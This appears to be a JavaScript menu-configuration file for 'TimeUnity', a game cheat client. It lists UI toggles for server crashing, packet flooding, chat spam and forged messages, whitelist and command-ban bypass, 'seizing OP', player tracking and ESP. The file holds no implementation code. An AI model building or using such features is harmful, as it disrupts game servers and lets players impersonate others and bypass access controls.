          "key": "AutoCrasher_Text",
          "hint": "127.0.0.1:10086",
          "max_lines": 6
        },
        {
          "type": "Switch",
          "name": "睡觉刷屏",
          "color": "${main_item_color || "#121212"}",
          "key": "PacketSleep",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "PacketSleep_Speed",
          "format": "刷屏速度%d",
          "min": 1,
          "max": 100,
          "value": 1
        },
        {
          "type": "Switch",
          "name": "粒子爆炸",
          "color": "${main_item_color || "#121212"}",
          "key": "ParticleBoom",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
            "type": "CheckBox",
            "key": "ParticleBoom_ShowParticle",
            "name": "显示粒子",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "ParticleBoom_Quantity",
          "format": "粒子数量%d",
          "min": 1,
          "max": 180,
          "value": 20
        },
        {
          "type": "Switch",
          "name": "玩家追踪",
          "color": "${main_item_color || "#121212"}",
          "key": "ServerChecker",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "EditText",
          "name": "UID",
          "color": "${main_item_color || "#121212"}",
          "key": "ServerChecker_UID",
          "hint": "123456",
          "max_lines": 6
        },
        {
          "type": "Switch",
          "name": "一键卡服",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/TickStop.png",
            "on": "TimeUnity_Shortcut/open/TickStop.png",
            "icon": "TimeUnity_Shortcut/close/TickStop.png"
          },
          "key": "TickStop",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "TickStop_Delay",
          "format": "发送延迟%d",
          "min": 0,
          "max": 20,
          "value": 0
        },
        {
          "type": "RadioGroup",
          "name": "卡服模式",
          "color": "${main_item_color || "#121212"}",
          "key": "TickStop_Mode",
          "items": [
            {
              "key": "TickStop_Mode_0",
              "name": "命令",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            },
            {
              "key": "TickStop_Mode_1",
              "name": "文本",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            }
          ]
        },
        {
          "type": "Switch",
          "name": "信标轰炸",
          "color": "${main_item_color || "#121212"}",
          "key": "Beacon_Packet",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
            "type": "CheckBox",
            "key": "Beacon_Packet_Block",
            "name": "屏蔽信标",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
           "type": "SeekBar",
            "key": "Packet_Speed",
            "format": "发包速度:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 30,
            "min": 1,
            "max": 120
        },
        {
          "type": "Switch",
          "name": "执行命令",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/CmdFile.png",
            "on": "TimeUnity_Shortcut/open/CmdFile.png",
            "icon": "TimeUnity_Shortcut/close/CmdFile.png"
          },
          "key": "CmdFile",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
           "type": "SeekBar",
            "key": "CmdBoost",
            "format": "执行速度:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 1,
            "min": 1,
            "max": 20
        },
        {
          "type": "Switch",
          "name": "虚影障幕",
          "color": "${main_item_color || "#121212"}",
          "key": "Structure",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": ${Ftion.exist("FillStructure")}
        },
        {
          "type": "CheckBox",
          "name": "排除自身",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "NotMe",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "选中自身",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "target_self",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "锁定坐标",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "LockPos",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "环绕模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "CircleMode",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "使用文件",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "JsonMode",
          "checked": false,
          "enabled": true
        },
        {
          "type": "SeekBar",
          "name": "延迟时间",
          "color": "${main_item_color || "#121212"}",
          "key": "DelayTime",
          "format": "延迟时间%d",
          "min": 0,
          "max": 30,
          "value": 2
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "MoveSpeed",
          "format": "环绕速度%.2f",
          "min": 0.1,
          "max": 5.0,
          "value": 0.1
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "MoveRadius",
          "format": "环绕半径%d",
          "min": 1,
          "max": 10,
          "value": 3
        },
        {
          "type": "SeekBar",
          "name": "X轴尺寸",
          "color": "${main_item_color || "#121212"}",
          "key": "Xsize",
          "format": "X轴尺寸%d",
          "min": 0,
          "max": 30,
          "value": 0
        },
        {
          "type": "SeekBar",
          "name": "Y轴尺寸",
          "color": "${main_item_color || "#121212"}",
          "key": "Ysize",
          "format": "Y轴尺寸%d",
          "min": 0,
          "max": 30,
          "value": 0
        },
        {
          "type": "SeekBar",
          "name": "Z轴尺寸",
          "color": "${main_item_color || "#121212"}",
          "key": "Zsize",
          "format": "Z轴尺寸%d",
          "min": 0,
          "max": 30,
          "value": 0
        },
        {
          "type": "SeekBar",
          "name": "X偏移",
          "color": "${main_item_color || "#121212"}",
          "key": "Xoffset",
          "format": "X偏移%d",
          "min": -10,
          "max": 10,
          "value": 0
        },
        {
          "type": "SeekBar",
          "name": "Y偏移",
          "color": "${main_item_color || "#121212"}",
          "key": "Yoffset",
          "format": "Y偏移%d",
          "min": -10,
          "max": 10,
          "value": 0
        },
        {
          "type": "SeekBar",
          "name": "Z偏移",
          "color": "${main_item_color || "#121212"}",
          "key": "Zoffset",
          "format": "Z偏移%d",
          "min": -10,
          "max": 10,
          "value": 0
        },
        {
          "type": "Switch",
          "name": "聊天卡人",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/ChatLock.png",
            "on": "TimeUnity_Shortcut/open/ChatLock.png",
            "icon": "TimeUnity_Shortcut/close/ChatLock.png"
          },
          "key": "ChatLock",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": ${Ftion.exist("ChatLock")}
        },
        {
          "type": "RadioGroup",
          "name": "选择选项",
          "color": "${main_item_color || "#121212"}",
          "key": "ChatLock_Option",
          "items": [
            {
              "key": "ChatLock_Whole",
              "name": "选择全体",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            },
            {
              "key": "ChatLock_Attack",
              "name": "选择攻击",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            },
            {
              "key": "ChatLock_Player",
              "name": "选择玩家",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            }
          ]
        },
        {
          "type": "Switch",
          "name": "彩色发言",
          "color": "${main_item_color || "#121212"}",
          "key": "ColorChat",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "伪造发言",
          "color": "${main_item_color || "#121212"}",
          "key": "FakeChat",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "伪造名称",
          "color": "${main_item_color || "#121212"}",
          "key": "FakeChat_Name",
          "hint": "TimeUnity",
          "max_lines": 6
        },
        {
          "type": "EditText",
          "name": "伪造文本",
          "color": "${main_item_color || "#121212"}",
          "key": "FakeChat_Text",
          "hint": "你充Q币吗",
          "max_lines": 6
        },
        {
          "type": "SeekBar",
          "name": "延迟",
          "color": "${main_item_color || "#121212"}",
          "key": "FakeChat_Delay",
          "format": "延迟%d",
          "min": 0,
          "max": 5,
          "value": 3
        },
        {
          "type": "Switch",
          "name": "自我介绍",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/Spammer.png",
            "on": "TimeUnity_Shortcut/open/Spammer.png",
            "icon": "TimeUnity_Shortcut/close/Spammer.png"
          },
          "key": "WelCome",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "介绍文本",
          "color": "${main_item_color || "#121212"}",
          "key": "WelCome_Text",
          "hint": "§cTimeUnity入侵服务器",
          "max_lines": 6
        },
        {
          "type": "Switch",
          "name": "自动发言",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/Spammer.png",
            "on": "TimeUnity_Shortcut/open/Spammer.png",
            "icon": "TimeUnity_Shortcut/close/Spammer.png"
          },
          "key": "Spammer",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "发言文本",
          "color": "${main_item_color || "#121212"}",
          "key": "Spammer_Text",
          "hint": "人机",
          "max_lines": 6
        },
        {
          "type": "CheckBox",
          "name": "彩色文本",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Spammer_UseColor",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "宠物名称",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Spammer_PetName",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "使用词库",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "TermBase",
          "checked": false,
          "enabled": true
        },
        {
          "type": "SeekBar",
          "name": "发言延迟",
          "color": "${main_item_color || "#121212"}",
          "key": "Spammer_Delay",
          "format": "发言延迟%d",
          "min": 0,
          "max": 20,
          "value": 0
        },
        {
          "type": "Switch",
          "name": "反文本轰炸",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiText",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "at_max_text",
          "format": "单位时间最大文本: %d条",
          "min": 1,
          "max": 30,
          "value": 5
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "at_max_time",
          "format": "单位时间长度: %dTick",
          "min": 1,
          "max": 100,
          "value": 20
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "at_max_len",
          "format": "最长消息长度: %d",
          "min": 10,
          "max": 200,
          "value": 50
        },
        {
          "type": "Switch",
          "name": "召唤狐狸",
          "color": "${main_item_color || "#121212"}",
          "key": "SummonFox",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": false
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "SummonFox_Speed",
          "format": "召唤速度%d",
          "min": 1,
          "max": 20,
          "value": 1
        },
        {
          "type": "Switch",
          "name": "铁砧换行",
          "color": "${main_item_color || "#121212"}",
          "key": "Anvil_NewLine",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "Switch",
          "name": "跨等级交易",
          "color": "${main_item_color || "#121212"}",
          "key": "AcrossLevelTrade",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "Switch",
          "name": "受击卡空",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiHit",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "无视饥饿",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiStarve",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "TextView",
          "name": "查询服务器",
          "color": "${main_item_color || "#121212"}",
          "key": "getServer"
        },
        {
          "type": "TextView",
          "name": "查询UID",
          "color": "${main_item_color || "#121212"}",
          "key": "getUID"
        },
        {
          "type": "TextView",
          "name": "查询信息",
          "color": "${main_item_color || "#121212"}",
          "key": "getInformation"
        },
        {
          "type": "TextView",
          "name": "查人在线",
          "color": "${main_item_color || "#121212"}",
          "key": "getServerFlag"
        },
        {
          "type": "TextView",
          "name": "查询IP",
          "color": "${main_item_color || "#121212"}",
          "key": "getServerIP"
        },
        {
          "type": "TextView",
          "name": "远程塞人",
          "color": "${main_item_color || "#121212"}",
          "key": "FillServer"
        },
        {
          "type": "TextView",
          "name": "皮肤美化",
          "color": "${main_item_color || "#121212"}",
          "key": "CrackSkin"
        },
        {
          "type": "TextView",
          "name": "绕过白名单",
          "color": "${main_item_color || "#121212"}",
          "key": "BypassWhitelist"
        },
        {
          "type": "EditText",
          "name": "绕违禁执行",
          "color": "${main_item_color || "#121212"}",
          "key": "PleaseCommand",
          "hint": "say 傻逼网易",
          "max_lines": 6
        },
        {
          "type": "CheckBox",
          "name": "循环执行",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "PleaseForCommand",
          "checked": false,
          "enabled": true
        },
        {
          "type": "TextView",
          "name": "执行指令",
          "color": "${main_item_color || "#121212"}",
          "key": "SendPleaseCommand"
        }
      ]
    }
  ]
}`
const TU娱乐类 = `{
  "type": "Menu",
  "title": {
    "name": "『 TU-娱乐 』",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": ${main_radius || 8},
  "can_close": true,
  "hide_fun": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "『 TU-娱乐 』",
      "color": "${main_item_color || "#121212"}",
      "tag": "TU娱乐类",
      "items": [
        {
          "type": "Switch",
          "name": "附魔修改",
          "color": "${main_item_color || "#121212"}",
          "key": "EnchantMod",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "EnchantMod_Level",
          "format": "附魔等级%d",
          "min": 1,
          "max": 32767,
          "value": 10
        },
        {
          "type": "Switch",
          "name": "AI聊天",
          "color": "${main_item_color || "#121212"}",
          "key": "AIChat",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": ${Ftion.exist("AllAIChat")}
        },
        {
          "type": "RadioGroup",
          "name": "选择选项",
          "color": "${main_item_color || "#121212"}",
          "key": "AIChat_Option",
          "items": [
            {
              "key": "AIChat_Single",
              "name": "私聊模式",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            },
            {
              "key": "AIChat_Whole",
              "name": "全体模式",
              "color": "${main_item_color || "#121212"}",
              "checked": false
            }
          ]
        },
        {
          "type": "CheckBox",
          "name": "显示[AI]",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "AIChat_Display",
          "checked": true,
          "enabled": true
        },
        {
          "type": "TextView",
          "name": "查看聊天记录",
          "color": "${main_item_color || "#121212"}",
          "key": "AIChat_Record"
        },
        {
          "type": "TextView",
          "name": "清除聊天记录",
          "color": "${main_item_color || "#121212"}",
          "key": "AIChat_ClearRecord"
        },
        {
          "type": "Switch",
          "name": "自杀光环",
          "color": "${main_item_color || "#121212"}",
          "key": "SuicideAura",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": ${Ftion.exist("SuicideAura")}
        },
        {
          "type": "Switch",
          "name": "模拟充值",
          "color": "${main_item_color || "#121212"}",
          "key": "Simulated",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "TextView",
          "name": "我要HVH",
          "color": "${main_item_color || "#121212"}",
          "plugin_command": "/ww server nodeup1.yunmc.vip 10491"
        },
        {
          "type": "TextView",
          "name": "自我崩溃",
          "color": "${main_item_color || "#121212"}",
          "key": "SelfCollapse"
        },
        {
          "type": "TextView",
          "name": "夺取OP",
          "color": "${main_item_color || "#121212"}",
          "key": "fakeOP"
        },
        {
          "type": "TextView",
          "name": "屏蔽检测",
          "color": "${main_item_color || "#121212"}",
          "tip": "正在删除UI"
        }
      ]
    }
  ]
}`
const TU渲染类 = `{
  "type": "Menu",
  "title": {
    "name": "『 TU-渲染 』",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": ${main_radius || 8},
  "can_close": true,
  "hide_fun": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "『 TU-渲染 』",
      "color": "${main_item_color || "#121212"}",
      "tag": "TU渲染类",
      "items": [
         {
          "type": "Switch",
          "name": "攻击渲染",
          "color": "${main_item_color || "#121212"}",
          "key": "AttackESP",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
         },
         {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "AttackESP_length",
          "format": "渲染长度%d",
          "min": 1,
          "max": 15,
          "value": 5
         },
         {
          "type": "Switch",
          "name": "攻击闪电",
          "color": "${main_item_color || "#121212"}",
          "key": "AttackLightning",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
         },
         {
          "type": "CheckBox",
          "name": "音效",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "AttackLightning_Sound",
          "checked": true
         },
         {
          "type": "Switch",
          "name": "悬浮手",
          "color": "${main_item_color || "#121212"}",
          "key": "AirHand",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
         },
         {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "AirHand_fov",
          "format": "视角%.2f",
          "min": 1.00,
          "max": 180.00,
          "value": 120.00
         },
         {
          "type": "Switch",
          "name": "运动相机",
          "color": "${main_item_color || "#121212"}",
          "key": "MoveCamera",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
         },
         {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Amplitu",
          "format": "运动幅度:%d",
          "min": 1,
          "max": 10,
          "value": 3
         },
         {
          "type": "Switch",
          "name": "修改相机",
          "color": "${main_item_color || "#121212"}",
          "key": "setCamera",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
         },
         {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "CameraX",
          "format": "偏移X:%d",
          "min": -20,
          "max": 20,
          "value": 0
         },
         {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "CameraY",
          "format": "偏移Y:%d",
          "min": -20,
          "max": 20,
          "value": 0
         },
         {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "CameraZ",
          "format": "偏移Z:%d",
          "min": -20,
          "max": 20,
          "value": 0
         },
         {
          "type": "Switch",
          "name": "修改挥手",
          "color": "${main_item_color || "#121212"}",
          "key": "SetHand",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
         },
         {
          "type": "SeekBar",
          "name": "挥手速度",
          "color": "${main_item_color || "#121212"}",
          "key": "Hand_Speed",
          "format": "挥手速度%d",
          "min": -10,
          "max": 10,
          "value": 0
         },
         {
          "type": "Switch",
          "name": "显示坐标",
          "color": "${main_item_color || "#121212"}",
          "key": "CoordHUD",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
         },
         {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "TextPosX",
          "format": "X坐标:%d",
          "min": 1,
          "max": 500,
          "value": 108
         },
         {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "TextPosY",
          "format": "Y坐标:%d",
          "min": 1,
          "max": 500,
          "value": 2
         },
         {
          "type": "Switch",
          "name": "自由视角",
          "color": "${main_item_color || "#121212"}",
          "key": "Camera",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "显示区块",
          "color": "${main_item_color || "#121212"}",
          "key": "ShowChunk",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "攻击音效",
          "color": "${main_item_color || "#121212"}",
          "key": "AttackSound",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "攻击粒子",
          "color": "${main_item_color || "#121212"}",
          "key": "AttackParticle",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "粒子ID",
          "color": "${main_item_color || "#121212"}",
          "key": "AttackParticle_ID",
          "hint": "3",
          "max_lines": 6
        },
        {
          "type": "SeekBar",
          "name": "粒子数量",
          "color": "${main_item_color || "#121212"}",
          "key": "AttackParticle_Num",
          "format": "粒子数量%d",
          "min": 1,
          "max": 50,
          "value": 5
        },
        {
          "type": "Switch",
          "name": "时间修改",
          "color": "${main_item_color || "#121212"}",
          "key": "ModifyTime",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "ModifyTime_Time",
          "format": "时间%d",
          "min": 0,
          "max": 100,
          "value": 20
        },
        {
          "type": "CheckBox",
          "name": "是否下雨",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "ModifyRain",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "迷雾渲染",
          "color": "${main_item_color || "#121212"}",
          "key": "FogRender",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
           "type": "ColorPicker",
           "key": "FogColor_1",
           "name": "起始雾色",
           "color": "${main_item_color || "#121212"}",
           "default_color": "#FF9632C8",
           "ok": "确定",
           "cancel": "取消"
        },
        {
           "type": "ColorPicker",
           "key": "FogColor_2",
           "name": "最终雾色",
           "color": "${main_item_color || "#121212"}",
           "default_color": "#FFC86496",
           "ok": "确定",
           "cancel": "取消"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "FogRender_Range",
          "format": "迷雾范围%d",
          "min": 10,
          "max": 100,
          "value": 30
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "FogColor_Speed",
          "format": "渐变速度%d",
          "min": 1,
          "max": 30,
          "value": 10
        },
        {
          "type": "Switch",
          "name": "挖掘渲染",
          "color": "${main_item_color || "#121212"}",
          "key": "DestroyBlockRender",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "HYT击杀提示",
          "color": "${main_item_color || "#121212"}",
          "key": "KillSound",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "受击无抖动",
          "color": "${main_item_color || "#121212"}",
          "key": "NoShake",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "屏蔽虚影",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiGhost",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "屏蔽粒子",
          "color": "${main_item_color || "#121212"}",
          "key": "NoParticle",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        }
      ]
    }
  ]
}`
const TU开发类 = `{
  "type": "Menu",
  "title": {
    "name": "『 TU-开发 』",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": ${main_radius || 8},
  "can_close": true,
  "hide_fun": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "『 TU-开发 』",
      "color": "${main_item_color || "#121212"}",
      "tag": "TU开发类",
      "items": [
        {
          "type": "Switch",
          "name": "PyRpc管理",
          "color": "${main_item_color || "#121212"}",
          "key": "PyRpcTube",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "CheckBox",
          "name": "发送Rpc",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "PyRpcTube_Send",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "接收Rpc",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "PyRpcTube_Receive",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "输出Rpc",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "PyRpcTube_Tip",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "循环发送",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "PyRpcTube_Cycle",
          "checked": false,
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "PyRpcTube_Delay",
          "format": "发送延迟%d",
          "min": 0,
          "max": 10,
          "value": 1
        },
        {
          "type": "CheckBox",
          "name": "保存至文件",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "PyRpcTube_Save",
          "checked": false,
          "enabled": true
        },
        {
          "type": "TextView",
          "name": "自定义Rpc",
          "color": "${main_item_color || "#121212"}",
          "key": "PyRpcTube_Custom"
        },
        {
          "type": "Switch",
          "name": "停止收包",
          "color": "${main_item_color || "#121212"}",
          "key": "NoReceivePacket",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        }
      ]
    }
  ]
}`
const TU原版类 = `{
    "type": "Menu",
    "title": {
        "name": "『 TU-原版 』",
        "size": 16,
        "elevation": 3,
        "background": "${main_title_background || "#FFFFFF"}",
        "padding": [4, 2, 4, 2],
        "text_margins": [3, 2, 3, 2],
        "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
    },
    "color": "${main_color || "#FFFFFF"}",
    "alpha": ${main_alpha || 0.85},
    "radius": ${main_radius || 8},
    "can_close": true,
    "hide": true,
    "items": [
        {
            "type": "Switch",
            "name": "踏空",
            "color": "${main_item_color || "#121212"}",
            "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/Air_jump.png",
            "on": "TimeUnity_Shortcut/open/Air_jump.png",
            "icon": "TimeUnity_Shortcut/close/Air_jump.png"
            },
            "tag": "fun_air_jump",
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "items": [
                {
                    "type": "CheckBox",
                    "key": "auto_jump",
                    "name": "自动跳跃",
                    "color": "${menu_item_check_color || "#121212"}"
